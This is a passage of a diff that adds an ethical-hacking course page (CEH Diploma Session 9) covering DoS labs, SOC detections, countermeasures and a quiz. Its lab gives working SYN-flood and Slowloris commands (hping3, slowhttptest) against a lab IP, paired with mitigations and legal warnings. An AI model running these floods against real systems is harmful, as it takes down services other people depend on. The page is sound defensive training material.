+# the fix, on Linux:  sysctl -w net.ipv4.tcp_syncookies=1</code></pre><p style="margin-top:8px"><b>You should see:</b> a pile of <span class="mono">SYN_RECV</span> connections is the unmistakable SYN-flood signature &mdash; and <span class="mono">tcp_syncookies</span> is the one-line kernel mitigation that lets the server answer without holding the half-open state.</p></div><div class="box key-takeaway"><span class="box-t">Exhaust state, not bandwidth</span><p><strong class="hl">SYN flood fills the connection table; Slowloris fills the worker pool.</strong> Both are low-bandwidth and beat big servers. SYN cookies and a timeout-enforcing reverse proxy are the targeted fixes.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab D: controlled DoS">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S09 &middot; P21</span><span class="tag lab">Hands-on &middot; everyone &middot; contained</span><span class="time">&#9201; 14 min</span></div>
+      <h1>Lab D &mdash; SYN Flood and Slowloris, Safely</h1>
+      <p class="lede">Take a lab service down two ways, watch the resource exhaust, then apply the mitigation and watch it recover.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Attack, measure, mitigate</span><p>You will run a SYN flood and a Slowloris against a <em>lab</em> web server, measure the exhaustion, then apply the fix and confirm recovery. The value is seeing the <strong>resource</strong> deplete and the <strong>mitigation</strong> restore it &mdash; not the takedown itself.</p></div><div class="box warn"><span class="box-t">Isolated lab service only</span><p>DoS against any system you do not own is a serious crime, botnet or not. One lab web VM on the host-only network; keep the flood short and stop it cleanly.</p></div>
+      <ol class="steps">
+<li>
+<b>SYN flood</b> the lab server and measure the half-open connections:
+<pre><code>sudo hping3 -S --flood -p 80 192.168.56.20     # SYN flood (lab target)
+# on the TARGET, watch the connection table fill:
+ss -tan state syn-recv | wc -l                  # climbs fast</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>The <span class="mono">SYN_RECV</span> count climbs and real requests start to fail &mdash; the connection table is the resource being exhausted.</li></ul></div>
+</li>
+<li>
+<b>Mitigate</b> the SYN flood and confirm recovery:
+<pre><code># on the target:
+sudo sysctl -w net.ipv4.tcp_syncookies=1
+# the server can now answer SYNs without holding half-open state -> service recovers</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>SYN cookies let the server respond without reserving a table slot, so it serves real users again even under the flood &mdash; the targeted fix working.</li></ul></div>
+</li>
+<li>
+<b>Slowloris</b> &mdash; exhaust the worker pool with almost no bandwidth:
+<pre><code>slowhttptest -c 500 -H -i 10 -r 200 -u http://192.168.56.20/    # slowloris-style
+# the server stops answering new requests though bandwidth is tiny</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>A few hundred slow connections tie up every worker and new users get nothing &mdash; app-layer exhaustion, not bandwidth.</li></ul></div>
+</li>
+<li>
+<b>Mitigate</b> Slowloris and note the class-specific defence:
+<pre><code># put a reverse proxy (nginx) in front with strict header/read timeouts,
+# or enable mod_reqtimeout on Apache. Slow connections get dropped.
+# lesson: each DoS CLASS needs its own fix — no single switch stops all three.</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>A timeout-enforcing proxy drops the never-completing requests and the service recovers &mdash; a different fix for a different class, which is the whole point of classifying DoS.</li></ul></div>
+</li>
+</ol>
+      <div class="box key-takeaway"><span class="box-t">See the resource, apply the matching fix</span><p><strong class="hl hl-d">Each DoS class exhausts a different resource and needs a different fix.</strong> SYN cookies for the connection table, timeouts/proxy for the worker pool, upstream scrubbing for bandwidth. Classify first, then mitigate.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="The consolidated SOC flip">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S09 &middot; P22</span><span class="tag defensive">Defender &middot; four surfaces, four signatures</span><span class="time">&#9201; 6 min</span></div>
+      <h1>Every Attack Today, and the Signal It Left</h1>
+      <p class="lede">Four surfaces, four detections. Here is the defender&#39;s view of the whole session &mdash; the signature of each attack you ran.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Four attacks, four tells</span><p>Network, session, human, availability &mdash; each attack in this session leaves a distinct, catchable signal. Learn the four and you can defend the whole surface you just attacked. Click each.</p></div>
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 300" role="img" aria-label="Interactive map: four attack surfaces in orange on the left, each paired with its detection signature in green on the right. Click each.">
+          <text x="235" y="26" text-anchor="middle" font-size="13" class="d-title" fill="#ff7043">ATTACK</text>
+          <text x="705" y="26" text-anchor="middle" font-size="13" class="d-title" fill="#4ade80">SOC sees</text>
+          <line x1="470" y1="40" x2="470" y2="286" stroke="#333b4c" stroke-width="1.2" stroke-dasharray="3 4"/>
+          <g class="node" data-node="arp" tabindex="0"><rect x="20" y="48" width="430" height="52" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="38" y="70" font-size="12">ARP poisoning / MITM</text><text class="d-sub" x="38" y="90" class="d-mono">forged ARP replies</text></g>
+          <rect x="490" y="48" width="430" height="52" rx="8" fill="#12241c" stroke="#4ade80"/><text class="d-lbl" x="508" y="70" font-size="13" fill="#4ade80" class="d-mono">ARP anomaly</text><text class="d-sub" x="508" y="90">gateway IP maps to a new MAC / one MAC, many IPs</text><path d="M450,74 L488,74" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <g class="node" data-node="hij" tabindex="0"><rect x="20" y="112" width="430" height="52" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="38" y="134" font-size="12">Session hijack (steal &amp; replay)</text><text class="d-sub" x="38" y="154" class="d-mono">reuse a stolen token</text></g>
+          <rect x="490" y="112" width="430" height="52" rx="8" fill="#12241c" stroke="#4ade80"/><text class="d-lbl" x="508" y="134" font-size="13" fill="#4ade80" class="d-mono">token from 2 IPs</text><text class="d-sub" x="508" y="154">one session ID, two sources / impossible-travel geo</text><path d="M450,138 L488,138" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <g class="node" data-node="ph" tabindex="0"><rect x="20" y="176" width="430" height="52" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="38" y="198" font-size="12">Phishing (credential harvest)</text><text class="d-sub" x="38" y="218" class="d-mono">look-alike domain + lure</text></g>
+          <rect x="490" y="176" width="430" height="52" rx="8" fill="#12241c" stroke="#4ade80"/><text class="d-lbl" x="508" y="198" font-size="13" fill="#4ade80" class="d-mono">young look-alike domain</text><text class="d-sub" x="508" y="218">new-domain email + user report + new-geo login</text><path d="M450,202 L488,202" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <g class="node" data-node="dos" tabindex="0"><rect x="20" y="240" width="430" height="46" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="38" y="262" font-size="12">DoS / DDoS</text><text class="d-sub" x="38" y="279" class="d-mono">flood / SYN / Slowloris</text></g>
+          <rect x="490" y="240" width="430" height="46" rx="8" fill="#12241c" stroke="#4ade80"/><text class="d-lbl" x="508" y="260" font-size="12.5" fill="#4ade80">traffic / state spike</text><text class="d-sub" x="508" y="278">Gbps surge, SYN_RECV pile-up, or all workers busy</text><path d="M450,263 L488,263" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+        </svg>
+        <div class="dgm-hint">Click each &mdash; the exact signal and the rule that fires on it.</div>
+        <div class="dgm-detail" data-detail="arp"><h5><span class="dd-tag">MITM &rarr; ARP anomaly</span>The mapping moved</h5><p><b>arpwatch / XArp / an EDR flags the gateway&#39;s IP suddenly binding to a new MAC, or one MAC claiming several IPs.</b> Rule: alert on ARP reply that changes an existing IP&harr;MAC binding, especially for the gateway. Preventive controls: Dynamic ARP Inspection, static ARP, port security.</p></div>
+        <div class="dgm-detail" data-detail="hij"><h5><span class="dd-tag">HIJACK &rarr; token from 2 IPs</span>One identity, two places</h5><p><b>A single session ID used from two source IPs concurrently, or a geolocation jump that travel cannot explain.</b> Rule: correlate session ID to source IP/geo; alert on concurrent or impossible-travel use. Also a user-agent change mid-session. Controls: TLS, <span class="mono">Secure/HttpOnly/SameSite</span>, short expiry, token binding.</p></div>
+        <div class="dgm-detail" data-detail="ph"><h5><span class="dd-tag">PHISHING &rarr; look-alike domain</span>The domain always tells</h5><p><b>A newly-registered look-alike domain in an email link, a login from a new geography shortly after, and &mdash; the best sensor &mdash; a user who reports the message.</b> Rule: flag mail from young/look-alike domains; correlate with a subsequent anomalous login. Controls: DMARC/SPF/DKIM, MFA (a phished password alone fails), reporting button, awareness.</p></div>
+        <div class="dgm-detail" data-detail="dos"><h5><span class="dd-tag">DoS &rarr; volume/state spike</span>The resource depletes visibly</h5><p><b>Volumetric: a bandwidth surge (NetFlow). Protocol: a pile-up of <span class="mono">SYN_RECV</span>. App-layer: all workers busy at low request rate.</b> Rule: threshold on traffic volume, half-open connection count, and concurrent-connection duration. Controls matched to class: upstream scrubbing/CDN, SYN cookies, proxy timeouts/rate limits.</p></div>
+      </figure>
+      <div class="box key-takeaway"><span class="box-t">Four surfaces, four signatures</span><p><strong class="hl hl-d">Everything you attacked leaves a signal.</strong> ARP anomaly, token-from-two-IPs, look-alike domain, traffic/state spike. Learn the four and you monitor the whole environment around the app &mdash; your Lab E.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab E: detect &amp; report">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S09 &middot; P23</span><span class="tag lab">Hands-on &middot; deliverable</span><span class="time">&#9201; 20 min</span></div>
+      <h1>Lab E &mdash; Detect the Attacks, Write the Assessment</h1>
+      <p class="lede">Turn the afternoon into defence: a detection for each surface, and the assessment report that ties network, session, human, and availability together.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">The consolidated deliverable</span><p>Close the loop across all four surfaces. Write at least two <strong>detections</strong> (an ARP-anomaly monitor and a session-hijack or phishing rule), then the <strong>assessment report</strong>: what you tested on each surface, what you found, the evidence, and the prioritised fixes. This is the product of a broad network-and-human assessment.</p></div>
+      <h2><span class="h-t">Detections to write</span></h2>
+      <pre><code># 1) ARP anomaly (host or IDS) — the gateway MAC must not change:
+#    arpwatch logs 'changed ethernet address' for 192.168.56.1 -> alert
+#    Suricata: alert on ARP reply where IP has a new MAC (spoof signature)
+
+# 2) Session hijack (SIEM correlation):
+title: Session Token Used From Two Source IPs
+logsource: { product: webserver }
+detection:
+  selection: { event: authenticated_request }
+  condition: same session_id, distinct src_ip, within 5m
+level: high
+tags: [attack.credential_access, attack.t1539]
+
+# 3) DoS (host/flow):
+ss -tan state syn-recv | wc -l   # threshold -> SYN-flood alert
+</code></pre>
+      <ol class="steps">
+<li>
+<b>Validate</b> each detection against your own attack traffic from Labs A&ndash;D:
+<pre><code># Lab A's ARP poisoning -> the arpwatch/Suricata rule should fire
+# Lab B's cookie replay -> the two-IP session rule should fire
+# Lab D's SYN flood -> the SYN_RECV threshold should fire</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>Your own attacks are the test data &mdash; a rule that fires on traffic you generated is a validated rule.</li></ul></div>
+</li>
+<li>
+<b>Write the assessment report</b> &mdash; one section per surface:
+<pre><code># NETWORK:      MITM possible (no DAI); HTTP creds sniffable -> enforce TLS/DAI
+# SESSION:      cookie not HttpOnly/Secure; no expiry -> set flags, add expiry
+# HUMAN:        phishing click on test; no MFA -> MFA + awareness + reporting
+# AVAILABILITY: SYN flood succeeded (no syncookies) -> enable + rate-limit</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>Four surfaces, four findings, four fixes &mdash; a complete picture of the environment around the app, not just one bug.</li></ul></div>
+</li>
+<li>
+<b>Prioritise</b> by risk and note the highest-leverage single control:
+<pre><code># top fixes: MFA (kills phished passwords + limits token value),
+#            TLS + Secure/HttpOnly cookies (kills sniffing + XSS theft),
+#            DAI/port-security (kills MITM), SYN cookies (kills SYN flood)
+# MFA is the single highest-leverage control across surfaces.</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>A prioritised list with the highest-leverage control called out turns findings into a plan a team can execute this week.</li></ul></div>
+</li>
+</ol>
+      <div class="box do"><span class="box-t">Deliverable</span><p>Produce the report using <span class="mono">exercises/session-09/assessment_report_template.md</span> &mdash; four surfaces, evidence, prioritised fixes, with your detection rules attached.</p></div><div class="box key-takeaway"><span class="box-t">Assess the whole environment</span><p><strong class="hl">Network, session, human, availability &mdash; one report.</strong> Each surface has a finding, a detection, and a fix, and MFA + TLS + DAI + SYN cookies cover most of it. That breadth is what this session assessed.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Countermeasures">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S09 &middot; P24</span><span class="tag defensive">Defensive &middot; the fixes</span><span class="time">&#9201; 6 min</span></div>
+      <h1>Countermeasures &mdash; Hardening All Four Surfaces</h1>
+      <p class="lede">Every attack today has a specific, known fix. Learn the mapping so your report ends in a hardening plan.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">A fix for every surface</span><p>The defences here are well-established and mostly cheap &mdash; the gap is deployment, not knowledge. Learn the mapping surface by surface and you can close every finding you wrote.</p></div>
+      <div class="tbl-scroll">
+      <table><colgroup><col style="width:14%"><col style="width:44%"><col style="width:42%"></colgroup>
+      <thead><tr><th>Surface / attack</th><th>The fixes</th><th>Why they work</th></tr></thead>
+      <tbody>
+      <tr><td>Sniffing / MITM</td><td>TLS everywhere + HSTS; Dynamic ARP Inspection, static ARP, port security; VPN on untrusted nets</td><td>encryption makes captured traffic useless; DAI/port-security stop the ARP forgery at the switch</td></tr>
+      <tr><td>Session hijacking</td><td><span class="mono">Secure + HttpOnly + SameSite</span> cookies; strong random IDs; regenerate on login; short expiry; TLS</td><td>token can&#39;t be sniffed, read by script, or fixed; a stolen one expires fast</td></tr>
+      <tr><td>CSRF</td><td>anti-CSRF tokens (per request) + <span class="mono">SameSite</span>; re-auth for sensitive actions</td><td>the forged cross-site request lacks the token and the cookie isn&#39;t sent</td></tr>
+      <tr><td>Social engineering</td><td>MFA; awareness training on the levers; DMARC/SPF/DKIM; verify via a second channel; reporting culture</td><td>a phished password alone fails (MFA); trained, reporting users are the best sensor</td></tr>
+      <tr><td>DoS / DDoS</td><td>SYN cookies + rate limiting; reverse-proxy timeouts; upstream scrubbing / CDN; capacity + redundancy</td><td>each control matches a class (state / workers / bandwidth); scrubbing absorbs volumetric upstream</td></tr>
+      </tbody></table></div>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; apply the two highest-leverage controls</span><pre><code># 1) Session cookie flags (kills sniffing + XSS theft + fixation cheaply):
+#    Set-Cookie: session=...; Secure; HttpOnly; SameSite=Lax
+# 2) MFA (kills phished passwords AND limits a stolen token's value):
+#    enforce for all remote/privileged access
+# these two touch four of the five surfaces above.</code></pre><p style="margin-top:8px"><b>You should see:</b> two controls &mdash; hardened cookie flags and MFA &mdash; blunt sniffing, XSS theft, session fixation, and phishing at once. High leverage, low cost; they belong at the top of every report&#39;s recommendations.</p></div><div class="box key-takeaway"><span class="box-t">Cheap, known, under-deployed</span><p><strong class="hl hl-d">The fixes exist; the gap is deployment.</strong> TLS + cookie flags + DAI + MFA + SYN cookies cover most of this session. Your report&#39;s job is to make an org actually turn them on.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Where next">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S09 &middot; P25</span><span class="tag resources">Practice &middot; keep going</span><span class="time">&#9201; 5 min</span></div>
+      <h1>Practice Range &mdash; Network &amp; Human</h1>
+      <p class="lede">Free rooms and safe labs to drill sniffing, MITM, hijacking, and phishing awareness. Do at least one this week.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Reps across the four surfaces</span><p>These free rooms and lab setups let you practise each surface legally &mdash; MITM and sniffing on your own lab, phishing analysis on real (defanged) samples, and DoS concepts in contained ranges.</p></div>
+      <div class="rooms"><a class="room" href="https://tryhackme.com/room/phishingemails1tryoe" target="_blank" rel="noopener"><span class="room-tag freetier">FREE (rank)</span><span class="room-name">Phishing Analysis Fundamentals</span><span class="room-meta">read phishing like a defender &middot; headers, indicators</span><span class="room-note">Analyst-side phishing &mdash; the defensive half of Lab C; check it is free on the day.</span></a><a class="room" href="https://tryhackme.com/room/networkminer" target="_blank" rel="noopener"><span class="room-tag freetier">FREE (rank)</span><span class="room-name">Sniffing &amp; traffic analysis</span><span class="room-meta">pull credentials &amp; artifacts from captures</span><span class="room-note">Reads a MITM capture the way Lab A produced one; confirm free on the day.</span></a><a class="room" href="https://tryhackme.com/room/introtoattacks" target="_blank" rel="noopener"><span class="room-tag freetier">FREE (rank)</span><span class="room-name">Network attacks intro</span><span class="room-meta">ARP/MITM/hijacking fundamentals</span><span class="room-note">Structured intro to the network-attack half; some rooms free.</span></a>
+      </div><div class="box do"><span class="box-t">Safe local labs</span><p>Practise the attacks on your own kit: a <strong>host-only lab</strong> with two VMs for ARP/MITM (bettercap + Wireshark), <strong>DVWA</strong> for the CSRF and session labs, <strong>SET</strong> against your own test accounts for phishing, and <strong>slowhttptest/hping3</strong> against a throwaway lab web server for DoS. All legal because you own every endpoint.</p></div><div class="box warn"><span class="box-t">The lines you never cross</span><p><strong>MITM, phishing, and DoS against anything you do not own are serious crimes</strong> &mdash; unlike a web lab you can spin up, these hit real people and networks. Isolated lab, consenting test accounts, or explicit written authorisation &mdash; always.</p></div><div class="box key-takeaway"><span class="box-t">Drill the surface you defend</span><p><strong class="hl">One room or one lab this week.</strong> The four surfaces &mdash; wire, session, human, uptime &mdash; only become instinct with reps on targets you are allowed to attack.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Knowledge check">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S09 &middot; P26</span><span class="tag assess">Assess &middot; 6 questions</span><span class="time">&#9201; 10 min</span></div>
+      <h1>Knowledge Check</h1>
+      <p class="lede">Six questions across the session. Answer before you reveal &mdash; each explains the reasoning, not just the letter.</p>
+    </div>
+    <div class="content">
+<div class="quiz"><div class="q mcq" data-correct="b" data-why="On a switched network, frames are delivered only to the destination port, so you must actively redirect the victim's traffic to yourself — via ARP poisoning — to sniff it. A hub/open Wi-Fi would allow passive sniffing.">
+  <p><span class="qn">Q1</span>Why does sniffing on a modern switched network require ARP poisoning?</p>
+  <ul class="opts"><li data-opt="a">Switches encrypt all traffic</li><li data-opt="b">A switch delivers frames only to the destination port, so you must redirect the traffic to yourself</li><li data-opt="c">ARP poisoning decrypts HTTPS</li><li data-opt="d">Switches block promiscuous mode entirely</li></ul>
+  <div class="mcq-fb"></div>
+</div><div class="q mcq" data-correct="d" data-why="Session hijacking steals the token of an already-authenticated session, so authentication (including MFA) already happened — the attacker inherits it. That is why MFA on login does not stop a stolen active session.">
+  <p><span class="qn">Q2</span>You steal a valid session cookie and load it into your browser, gaining the victim's account. Why doesn't their MFA stop you?</p>
+  <ul class="opts"><li data-opt="a">MFA only protects admin accounts</li><li data-opt="b">The cookie contains the MFA code</li><li data-opt="c">MFA was never enabled</li><li data-opt="d">Authentication already happened; you inherit the active session, so login-time MFA is behind you</li></ul>
+  <div class="mcq-fb"></div>
+</div><div class="q mcq" data-correct="a" data-why="HttpOnly makes the cookie unreadable by document.cookie, so an XSS payload cannot exfiltrate it. It is the specific one-line defence against XSS-based cookie theft (though not against network sniffing — that needs Secure/TLS).">
+  <p><span class="qn">Q3</span>Which cookie flag specifically stops an XSS payload from stealing the session cookie?</p>
+  <ul class="opts"><li data-opt="a">HttpOnly &mdash; the cookie can't be read by document.cookie</li><li data-opt="b">Secure &mdash; only sent over HTTPS</li><li data-opt="c">SameSite &mdash; not sent cross-site</li><li data-opt="d">Path &mdash; limits the cookie's scope</li></ul>
+  <div class="mcq-fb"></div>
+</div><div class="q mcq" data-correct="c" data-why="CSRF works because the browser automatically attaches the target site's cookies to any request to that site, even one triggered from the attacker's page — so the forged request runs with the victim's session. The attacker never sees the cookie.">
+  <p><span class="qn">Q4</span>Why does a CSRF attack succeed without the attacker ever stealing the session cookie?</p>
+  <ul class="opts"><li data-opt="a">It cracks the cookie's encryption</li><li data-opt="b">It predicts the session ID</li><li data-opt="c">The browser auto-attaches the site's cookie to any request to that site, including the forged one</li><li data-opt="d">It uses XSS to read the cookie</li></ul>
+  <div class="mcq-fb"></div>
+</div><div class="q mcq" data-correct="b" data-why="Slowloris is application-layer: it holds many connections open by sending headers a byte at a time, tying up all worker threads with almost no bandwidth. The fix is a reverse proxy / connection timeouts, not bandwidth scrubbing.">
+  <p><span class="qn">Q5</span>A server stops responding under a few hundred slow connections at near-zero bandwidth. What is it, and the fix?</p>
+  <ul class="opts"><li data-opt="a">Volumetric flood; fix with upstream scrubbing</li><li data-opt="b">Slowloris (app-layer); fix with reverse-proxy connection timeouts</li><li data-opt="c">SYN flood; fix with SYN cookies</li><li data-opt="d">DNS amplification; fix with rate limiting</li></ul>
+  <div class="mcq-fb"></div>
+</div><div class="q mcq" data-correct="d" data-why="Social engineering exploits normal human instincts — authority, urgency, trust, fear, reciprocity. The most effective defences are MFA (a phished password alone fails) plus awareness training and a reporting culture; there is no purely technical patch for judgement.">
+  <p><span class="qn">Q6</span>What is the most effective defence against credential phishing?</p>
+  <ul class="opts"><li data-opt="a">A better spam filter alone</li><li data-opt="b">Stronger passwords</li><li data-opt="c">Blocking all external email</li><li data-opt="d">MFA plus awareness training and a reporting culture &mdash; a phished password alone then fails</li></ul>
+  <div class="mcq-fb"></div>
+</div></div><div class="box key-takeaway"><span class="box-t">Score yourself</span><p><strong class="hl">5&ndash;6 right:</strong> run a MITM lab or a phishing-analysis room next. <strong>3&ndash;4:</strong> re-read the session-hijacking and DoS pages. <strong>&lt;3:</strong> rewatch the ARP-poisoning and consolidated-SOC-flip diagrams.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Takeaways">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S09 &middot; P27</span><span class="tag summary">Wrap-up</span><span class="time">&#9201; 4 min</span></div>
+      <h1>Session 9 &mdash; What You Keep</h1>
+      <p class="lede">Ten things that outlast the tools. The wire, the session, the human, and uptime are always attackable &mdash; and always defensible.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">The durable core</span><p>You attacked the four things around the app: the network path, the session token, the human, and availability &mdash; then turned each into a detection and a fix. Tools change; the four surfaces and their defences do not.</p></div>
+      <ol class="takeaways">
+        <li><strong>A switch forces active sniffing.</strong> Passive listens on a shared medium; a switch makes you poison ARP to become the MITM.</li>
+        <li><strong>ARP trusts the last reply.</strong> No authentication means a forged mapping reroutes traffic &mdash; and shows up as an ARP anomaly.</li>
+        <li><strong>SSL strip attacks the redirect, not the crypto.</strong> HSTS removes the cleartext first request and defeats it.</li>
+        <li><strong>A session token is a bearer credential.</strong> Hold it and you are the user &mdash; login-time MFA is already behind you.</li>
+        <li><strong>Every theft method has a flag that stops it.</strong> Sniff&rarr;Secure, XSS&rarr;HttpOnly, fixation&rarr;regenerate, replay&rarr;expiry.</li>
+        <li><strong>CSRF uses the session it can't see.</strong> The browser attaches the cookie automatically; anti-CSRF tokens + SameSite stop it.</li>
+        <li><strong>Social engineering exploits normal instincts.</strong> Authority, urgency, trust, fear, reciprocity &mdash; name the lever to defend it.</li>
+        <li><strong>The domain always betrays a phish.</strong> The page can be perfect; the URL cannot. Reading the address bar + MFA beats most phishing.</li>
+        <li><strong>DoS exhausts a resource.</strong> Bandwidth, connection state, or app workers &mdash; classify it to pick the fix; DDoS just adds sources.</li>
+        <li><strong>Everything leaves a signal.</strong> ARP anomaly, token-from-two-IPs, look-alike domain, traffic/state spike &mdash; the environment is monitorable.</li>
+      </ol><div class="box bridge"><span class="box-t">Next &mdash; Session 10</span><p>You have covered the app and its surroundings. Session 10 &mdash; the final session &mdash; sweeps the rest of the CEH surface: <strong>IDS/firewall evasion</strong>, <strong>wireless attacks</strong> (WEP/WPA2 handshake capture, evil twin), and the <strong>emerging-tech</strong> frontier &mdash; mobile, IoT/OT, cloud, and cryptography &mdash; tying the whole diploma together.</p></div><div class="box key-takeaway"><span class="box-t">The through-line</span><p><strong class="hl">Attack the environment, defend the environment.</strong> The wire, the session, the human, and uptime are each a surface with a signature and a fix. Cover all four and you see what the app-only tester misses.</p></div>
+    </div>
+  </section>
+
+  <div class="pagenav">
+    <a href="#" id="btnPrev"><small>Previous</small><span class="lbl">&mdash;</span></a>
+    <a href="#" id="btnNext" class="next"><small>Next</small><span class="lbl">&mdash;</span></a>
+  </div>
+  <p class="kbd-hint">Navigate with <span class="kbd">&larr;</span> <span class="kbd">&rarr;</span> arrow keys ·
+     <span class="kbd">Home</span> / <span class="kbd">End</span> to jump</p>
+
+  </article>
+</div>
+</div>
+
+<footer class="site-foot">
+  <div class="wrap"><p>CEH Diploma · ITGate Academy · Session 09 — Sniffing, MITM, Session Hijacking, Social Engineering & DoS</p></div>
+</footer>
+
+<script src="../assets/js/session.js"></script>
+</body>
+</html>
